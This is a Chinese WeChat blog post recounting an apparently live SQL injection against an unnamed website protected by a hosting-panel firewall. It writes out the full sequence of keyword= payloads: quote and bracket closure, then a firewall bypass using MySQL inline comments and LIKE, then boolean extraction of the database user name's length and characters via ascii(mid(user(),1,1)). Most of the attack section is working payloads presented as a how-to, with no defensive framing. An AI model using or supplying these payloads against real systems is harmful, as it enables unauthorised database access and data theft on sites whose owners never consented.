---
title: 实战SQL注入某面板防火墙绕过
url: https://mp.weixin.qq.com/s/GLLhVmIFYUINVi4Qr2TWkA
source: Doonsec's feed
date: 2026-05-08
fetch_date: 2026-05-09T05:06:40.189462
---

# 实战SQL注入某面板防火墙绕过

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Pms46XiaGB2wYlPGuNVJSHc4NQiaCBNBHR96iaTsJ6zcl4t39gQKJeLpdbZzBDpbt18GAFhhlMx8jBn09rc4NvMsRky3j5HbnDr0o7nnMu2ibYM/0?wx_fmt=jpeg)

# 实战SQL注入某面板防火墙绕过

轩公子谈技术

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于我不懂安全
，作者Vlan911

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM6Cj8BL0RFU05hV3SpgOHicCaQjCdVl5fNG2N5Ze9BGQeg/0)

**我不懂安全**
.

分享挖掘漏洞小技巧，分享安全案例以及一些安全动态，分享实用技术

近期的一次SQL注入实战，通过手动测试发现站点存在SQL注入漏洞，首先在探测的时候，输入单引号查看效果

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pms46XiaGB2yiaVbg2xWQtV74k5tQyny9KqeR0ic9ymEw52KOeLyZdyfUhKOjZaH1rCvaYN2fBKw4m1bdehISQYreic74kLnh39bibCic0Srab7Ow/640?wx_fmt=png&from=appmsg)

再输入单引号进行闭合

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pms46XiaGB2zfjqEmjGg00icTicKPiblK4q7PIic3Mq2O5uVrCvWQpqfp06VSVdIx5JqqSiaXHMUVqGdTxruscnGmdhXeFyicaib2kiaH7bZy8xQXib9I/640?wx_fmt=png&from=appmsg)

通过报错信息可以直到，想要达到闭合条件最好还是使用%号、引号和括号，尝试闭合配合注释

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pms46XiaGB2wcK2v3y3hicLKdQTI4zyszLf212KA8jXBS0G8q6UiaDzt9OjwLlZRBtARLdvIwjuchzdFZrX2oZCkkKMPiaq5tYL7Vuv7X9WrFpM/640?wx_fmt=png&from=appmsg)

尝试使用布尔注入的时候，发现被拦截了

![](https://mmbiz.qpic.cn/mmbiz_png/Pms46XiaGB2yjvweOUjbrBWDc2bwbZ5IQrt6P5kXmZvF1OKs2fvvop1Uno6VmLFMUeeQEiaP3dTe1bIVjnCLBXicgwppOeuy3bukh8Ov4WickM4/640?wx_fmt=png&from=appmsg)

但是去掉or后面的字符就不拦截keyword=123%'+or+)--+-

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pms46XiaGB2yqaEMyicJq0usDZ9sdQBt5Tvc2rxcnHfwd294NpAibfKL1wcuEAK0YH4ZZLLJsq5NMzI8moXwT4icOa1PARmUXA0bCFGibJMetxxE/640?wx_fmt=png&from=appmsg)

尝试对or使用||、&、等编码转换，都会被拦截，似乎只要or后面跟东西就被拦截，灵机一动，发现可以实现布尔条件，并且数据发生明显变化keyword=123%'+or+'1')--+-

![](https://mmbiz.qpic.cn/mmbiz_png/Pms46XiaGB2wvQ5jdqJhicstoRmhRFJwlibcYHyOEHaIibTOctCDCgk87FCfYDpicbKoZw7wZGicoaI8B3EDNibM8m3z8Wcr1CqKAezEqiahibXcrNbQ/640?wx_fmt=png&from=appmsg)

看似成功，实则拦截keyword=123%'+or+'1'='1')--+-

![](https://mmbiz.qpic.cn/mmbiz_png/Pms46XiaGB2waiaKnJCiaEZXEV0XzCtLMICLFkA7htsmpMhBicYGnA6mj0U1Yib3cSqrgIbw4n5yneFq5UADZic5WibYM9DGmwZU5HVicGx3O6fticAg/640?wx_fmt=png&from=appmsg)

不过并没有什么用，这个时候就比较容易了，一手keyword=123%'+or+'1'=/\*!1\*/)--+-

![](https://mmbiz.qpic.cn/mmbiz_png/Pms46XiaGB2wC9BuDu4QFZS7O3oSNibXCBLpcPAge0Fcg2mL9pGIyaqZD11tjZG3Axqlib0ibR2rmmBGicWEXJdGOMQLyKzxthE2zS3HazTm0Rtg/640?wx_fmt=png&from=appmsg)

尝试条件为假的时候keyword=123%'+or+'1'=/\*!2\*/)--+-

![](https://mmbiz.qpic.cn/mmbiz_png/Pms46XiaGB2x6nCnDCVrJn0QsoBw2SibSkU4o8Qv0CU7rUowjqeOzoxTupOMmdaJksI0GNRyicqquGGoNoQGMW3OCF4FsnS37nL4WOkbog4Of0/640?wx_fmt=png&from=appmsg)

继续下一步的时候，发现似乎只能输入纯数字，字符串不行、函数也不行

keyword=123%'+or+'1'=/\*!length()\*/)--+-

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pms46XiaGB2xGib5oMiasfEmN5109XxAibJ0HXfibJ6XwA2A6IWVJTtN0NkEprGWs0SPFgVjXXMouoNrGLBG2TMzp61CK6WN2Bc7DCNBU6X3maSo/640?wx_fmt=png&from=appmsg)

keyword=123%'+or+'1'=/\*!'1'\*/)--+-

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pms46XiaGB2yhBRDAb1QPx8EB8y8L1V3nKlBeiaiaeB7F3acvsp7gzicV4vBxNZQEp0ZWOAH9eJncB5ReWMfZp96E0iaVCO18iacR7OX906kq7r74/640?wx_fmt=png&from=appmsg)

这更好绕keyword=123%'+or+'1'+like+/\*!length(1)\*/)--+-

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pms46XiaGB2wJkbzSXySg3YPicZLnZbUTzW94uPmgc1hS6dQrEDW5gapYMTjmPzHLfKicZo8KLOgqVW0WibEAZO9pZeiclhVwxoTFaxpd4IsSJxw/640?wx_fmt=png&from=appmsg)

这个时候再构造个假条件keyword=123%'+or+'1'+like+/\*!length(12)\*/)--+-

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pms46XiaGB2yQSnMibBW32yYdDiaViaH530HoxNYJbqMYulTOiawjBW7Bp6k3IZBmgKLkpjwlTJLITsX0lIOibw06YHTTJ99PtAQKibKFMfHLjZFa0/640?wx_fmt=png&from=appmsg)

没问题，此时尝试获取数据库当前用户名长度

keyword=123%'+or+'25'+like+/\*!length(user())\*/)--+-

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pms46XiaGB2wol12OpxJudTB536pgibW7ib1LsEYk3xsQZTTrj1wmOJvM06VbOwTqxsKMlXs4icMBJgP5j1arbZDlWfEBiaDGb293aHC88R2v56s/640?wx_fmt=png&from=appmsg)

获取当前数据库用户名第一位对应的ascii值

keyword=123%'+or+'100'+like+/\*!ascii(mid(user(),1,1))\*/)--+-

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pms46XiaGB2yR4l92osrgk8ibGWbZOGiaDBAQibWTx9GrxvVpMtBGLdVjabo0euJrn9dhtVpqPUwSwQwMV8oib2DQdFTPL6rqicsY78mW0VcGdcnc/640?wx_fmt=png&from=appmsg)

第二个字符

![](https://mmbiz.qpic.cn/sz_mmbiz_png/16lHuWzRRduLPVcSkkIgoVqwT7GOUpK6a6Zl3M1VMy0LiaZ0k8IibBm4trSagOPMxkJkfGmlpAicwRrT9JNQichjUVs9R3UN7QENiaVAia63IXY54/640?wx_fmt=png&from=appmsg)

以此类推，获得对应的库名

![](https://mmbiz.qpic.cn/sz_mmbiz_png/16lHuWzRRduZw502Ie0jlric6rzTImicicJ7vlXBWH0D16YF3dAIos49RglgPJRiaHBHL3FYdicYicKicvHDFfiafdzms5icyUCGyAGfCx40CaHFIZ5w/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQZCDnChGupgZyfRK8Bs8twy3rbw6gic8GAoiaqoIIVarKvqMgQ1vj4t0UyMNdvaIHmTE2XgzeSFn32Q/0?wx_fmt=png)

轩公子谈技术

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/BAby4Fk1HQZCDnChGupgZyfRK8Bs8twy3rbw6gic8GAoiaqoIIVarKvqMgQ1vj4t0UyMNdvaIHmTE2XgzeSFn32Q/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过